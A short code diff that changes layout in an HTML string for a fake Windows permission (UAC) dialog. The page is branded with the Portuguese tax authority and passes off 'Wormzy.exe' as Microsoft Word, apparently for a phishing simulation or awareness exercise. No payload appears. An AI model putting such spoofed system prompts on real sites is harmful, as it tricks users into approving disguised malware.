@@ -169,10 +169,10 @@ Gabinete da Autoridade Tributária de Portugal\
                 <span id='uactitle'>Pretende permitir que esta aplicação faça alterações ao seu dispositivo?</span>\
             </div>\
             <div id='uaccontent'>\
-                <span id='uacprogram'><i class='fa-solid fa-file-word'></i> Microsoft Word 2023/24 ® Microsoft</span><br><br><br>\
-                <span>Editor verificado: Free MS Word for Everyone<br>Origem do ficheiro: Disco neste computador</span><br><br>\
+                <span id='uacprogram'><i class='fa-solid fa-file-word'></i> Microsoft Word 2023/24 ® Microsoft</span><br><br>\
+                <span id='uacorigin'>Editor verificado: Free MS Word for Everyone<br>Origem do ficheiro: Disco neste computador</span><br><br>\
                 <span id='uaclink' onclick='uacdetalhes()'>Mostrar mais detalhes</span>\
-                <span id='uacaddress'><br>C:\\Users\\NOME\\Transferencias\\Wormzy.exe</span>\
+                <span id='uacaddress'>C:\\Users\\NOME\\Transferencias\\Wormzy.exe</span>\
             </div>\
             <div id='uacbottombar'>\
                 <input type='button' value='Sim' onclick='submitUAC(0)'><input type='button' value='Não' onclick='submitUAC(1)'>\
